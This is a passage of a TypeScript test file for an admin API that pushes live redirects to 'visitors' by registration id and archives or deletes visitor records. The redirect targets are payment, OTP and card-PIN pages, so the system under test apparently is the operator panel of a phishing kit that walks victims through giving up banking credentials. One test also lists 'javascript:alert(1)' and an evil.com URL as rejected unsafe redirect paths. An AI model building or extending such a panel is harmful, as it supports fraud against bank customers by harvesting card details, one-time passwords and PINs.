    const userCaller = appRouter.createCaller(buildContext("user"));
    await expect(
      userCaller.admin.redirectVisitor({ registrationId: 1, path: "/06-payment.html" }),
    ).rejects.toThrow();
  });

  it("redirectVisitor: publishes redirect and returns delivered count", async () => {
    const adminCaller = appRouter.createCaller(buildContext("admin"));
    (publishVisitorRedirect as any).mockReturnValueOnce(2);
    const res = await adminCaller.admin.redirectVisitor({
      registrationId: 42,
      path: "/08-otp.html",
    });
    expect(publishVisitorRedirect).toHaveBeenLastCalledWith("42", "/08-otp.html");
    expect(res.delivered).toBe(2);
  });

  it("redirectVisitor: rejects unsafe paths (no leading slash, javascript:, etc.)", async () => {
    const adminCaller = appRouter.createCaller(buildContext("admin"));
    await expect(
      adminCaller.admin.redirectVisitor({ registrationId: 1, path: "javascript:alert(1)" }),
    ).rejects.toThrow();
    await expect(
      adminCaller.admin.redirectVisitor({ registrationId: 1, path: "http://evil.com/x" }),
    ).rejects.toThrow();
    await expect(
      adminCaller.admin.redirectVisitor({ registrationId: 1, path: "06-payment.html" }),
    ).rejects.toThrow();
  });

  it("redirectVisitor: warns gracefully when no client connected (delivered=0)", async () => {
    const adminCaller = appRouter.createCaller(buildContext("admin"));
    (publishVisitorRedirect as any).mockReturnValueOnce(0);
    const res = await adminCaller.admin.redirectVisitor({
      registrationId: 999,
      path: "/10-card-pin.html",
    });
    expect(res.delivered).toBe(0);
  });

  it("archiveVisitors / unarchiveVisitors / deleteVisitors: reject empty ids array via zod", async () => {
    const adminCaller = appRouter.createCaller(buildContext("admin"));
    await expect(
      adminCaller.admin.archiveVisitors({ ids: [] as number[] }),
    ).rejects.toThrow();
    await expect(
      adminCaller.admin.unarchiveVisitors({ ids: [] as number[] }),
    ).rejects.toThrow();
    await expect(
      adminCaller.admin.deleteVisitors({ ids: [] as number[] }),
    ).rejects.toThrow();
  });

  it("listVisitors: passes through archived option to db helper", async () => {
    const adminCaller = appRouter.createCaller(buildContext("admin"));
    (dbMock.getAllVisitorsAggregated as any).mockClear();
    await adminCaller.admin.listVisitors({
      stage: "all",
      limit: 50,
      archived: "archived",
    });
    expect(dbMock.getAllVisitorsAggregated).toHaveBeenLastCalledWith(50, "archived", 0);
  });
});
